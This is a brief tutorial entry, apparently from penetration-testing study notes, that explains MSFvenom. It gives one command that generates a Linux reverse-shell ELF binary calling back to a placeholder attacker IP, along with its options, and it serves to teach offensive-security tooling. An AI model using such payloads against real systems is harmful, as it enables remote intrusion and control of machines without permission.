## MSFvenom

MSFvenom can generate payloads for different operating systems and file formats.

For example:

```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=<ATTACKER_IP> LPORT=4444 -f elf -o shell.elf
```

The important options are:

```text
-p    Payload
LHOST Attacker IP
LPORT Attacker listening port
-f    Output format
-o    Output file
```

MSFvenom can generate payloads for Windows, Linux, web applications, and many other environments.

